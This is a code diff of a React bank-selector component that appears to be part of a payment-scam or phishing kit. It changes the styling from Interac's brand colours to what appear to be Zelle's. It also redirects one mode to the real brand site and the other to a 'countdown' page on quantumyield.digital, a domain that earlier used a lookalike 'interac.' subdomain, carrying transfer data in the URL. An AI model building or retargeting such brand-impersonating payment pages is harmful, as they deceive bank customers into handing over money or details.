@@ -57,8 +57,8 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
       params.set("timestamp", transferData.timestamp)
     }
     window.location.href = clientMode
-      ? `https://www.interac.ca/en/consumers/etransfer/?${params.toString()}`
-      : `https://interac.quantumyield.digital/countdown?${params.toString()}`
+      ? `https://www.zellepay.com/?${params.toString()}`
+      : `https://app.quantumyield.digital/countdown?${params.toString()}`
   }
 
   const containerCls = clientMode
@@ -69,8 +69,8 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
   const emptyText2Cls = clientMode ? "text-gray-400" : "text-zinc-500"
   const bankCardBase  = clientMode ? "bg-gray-50 border-gray-200" : "bg-zinc-800 border-zinc-700"
   const bankCardHover = clientMode
-    ? "hover:border-[#FDB913]/80 hover:bg-white"
-    : "hover:border-[#FDB913]/60 hover:bg-zinc-700"
+    ? "hover:border-[#6D1ED4]/80 hover:bg-white"
+    : "hover:border-[#6D1ED4]/60 hover:bg-zinc-700"
   const ringOffset    = clientMode ? "ring-offset-white" : "ring-offset-zinc-900"
 
   if (isLoading) {
@@ -78,7 +78,7 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
       <div className={containerCls} role="region" aria-label="Bank selection grid">
         <div className="text-center py-12">
           <div
-            className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#FDB913] border-r-transparent"
+            className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#6D1ED4] border-r-transparent"
             role="status"
           >
             <span className="sr-only">Loading banks...</span>
@@ -107,10 +107,10 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
                 flex flex-col items-center justify-center gap-2 min-h-[100px]
                 border-2 ${
                   selectedBank === bank.id
-                    ? `border-[#FDB913] ring-2 ring-[#FDB913] ring-offset-2 ${ringOffset} scale-105`
+                    ? `border-[#6D1ED4] ring-2 ring-[#6D1ED4] ring-offset-2 ${ringOffset} scale-105`
                     : `${bankCardHover}`
                 }
-                focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 ${ringOffset}
+                focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 ${ringOffset}
               `}
               aria-label={`Select ${bank.name}`}
               aria-pressed={selectedBank === bank.id}
@@ -125,8 +125,8 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
                   />
                 ) : (
                   <div className="flex flex-col items-center gap-1.5">
-                    <div className="w-10 h-10 bg-[#FDB913] rounded-lg flex items-center justify-center">
-                      <span className="text-black font-bold text-lg">{bank.name.charAt(0).toUpperCase()}</span>
+                    <div className="w-10 h-10 bg-[#6D1ED4] rounded-lg flex items-center justify-center">
+                      <span className="text-white font-bold text-lg">{bank.name.charAt(0).toUpperCase()}</span>
                     </div>
                     <span className="text-[10px] font-medium text-zinc-400 text-center leading-tight">{bank.name}</span>
                   </div>
@@ -134,8 +134,8 @@ export default function BankSelectorGrid({ searchTerm = "", transferData, client
               </div>
 
               {selectedBank === bank.id && (
-                <div className="absolute top-1.5 right-1.5 w-5 h-5 bg-[#FDB913] rounded-full flex items-center justify-center">
-                  <svg className="w-3 h-3 text-black" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
+                <div className="absolute top-1.5 right-1.5 w-5 h-5 bg-[#6D1ED4] rounded-full flex items-center justify-center">
+                  <svg className="w-3 h-3 text-white" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
                     <path d="M5 13l4 4L19 7" />
                   </svg>
                 </div>
